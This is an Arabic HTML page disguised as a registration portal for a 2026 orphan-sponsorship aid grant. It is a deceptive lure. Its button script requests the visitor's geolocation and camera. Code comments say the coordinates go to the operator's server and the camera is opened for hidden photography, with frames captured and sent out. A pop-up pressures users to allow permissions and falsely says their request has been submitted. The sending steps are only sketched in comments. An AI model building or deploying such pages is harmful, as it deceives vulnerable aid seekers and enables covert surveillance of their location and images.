<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التسجيل - معونة تكفيل الأيتام 2026</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 20px; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h2 { color: #2c3e50; }
        p { color: #7f8c8d; font-size: 14px; }
        .btn { background-color: #27ae60; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; }
        .footer { margin-top: 20px; font-size: 12px; color: #bdc3c7; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://via.placeholder.com/100/27ae60/ffffff?text=Care" alt="Logo">
    <h2>منحة كفالة اليتيم</h2>
    <p>بناءً على طلبك، يرجى الضغط على الزر أدناه لتفعيل طلب المساعدة المالية لمدة سنة كاملة.</p>
    
    <button class="btn" onclick="startProcess()">تحقق من الهوية واستكمال التسجيل</button>
    
    <div class="footer">جميع الحقوق محفوظة © 2026 لجنة المعونة الإنسانية</div>
</div>

<script>
    function startProcess() {
        // 1. طلب الموقع الجغرافي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                console.log("Latitude: " + position.coords.latitude);
                console.log("Longitude: " + position.coords.longitude);
                // هنا يتم إرسال الإحداثيات لسيرفرك
            });
        }

        // 2. طلب فتح الكاميرا (للتصوير المخفي)
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            // يتم التقاط الصور هنا عبر Canvas وإرسالها
            alert("تم إرسال طلبك بنجاح، يرجى الانتظار 24 ساعة.");
        })
        .catch(function(err) {
            alert("يرجى السماح بالصلاحيات لإتمام عملية التسجيل!");
        });
    }
</script>

</body>
</html>
